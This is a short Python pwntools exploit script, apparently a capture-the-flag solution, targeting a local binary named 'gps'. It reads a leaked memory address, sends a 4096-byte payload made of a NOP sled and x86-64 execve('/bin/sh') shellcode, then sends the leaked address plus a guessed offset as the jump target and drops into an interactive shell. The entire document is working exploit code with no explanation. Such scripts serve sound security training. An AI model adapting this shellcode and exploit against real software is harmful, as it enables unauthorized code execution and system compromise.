#!/usr/bin/python
from pwn import *
import struct

# Setting the process
s = process("./gps")
gdb.attach(s, """break *0x0000000000400aaa
	c
	x/x $rax""")

address = s.recvuntil("> ")
size = 0x1000

shell = "\x31\xc0\x48\xbb\xd1\x9d\x96\x91\xd0\x8c\x97\xff\x48\xf7\xdb\x53\x54\x5f\x99\x52\x57\x54\x5e\xb0\x3b\x0f\x05"
shellSize = len(shell)
nop = "\x90"*(size - shellSize)

payload = nop + shell

print "[#] Payload (last 96 bytes): {0}".format(payload[4000:])
s.sendline(payload)


# Getting address
address = address.split(": ")[2].split("\n")[0][2:]

# Estimating offset
offset = 3000

address = hex(int(address, 16) + offset)
print "Address to jump to: {0}".format(address)

s.recvuntil("> ")
s.sendline(address[2:])

s.interactive()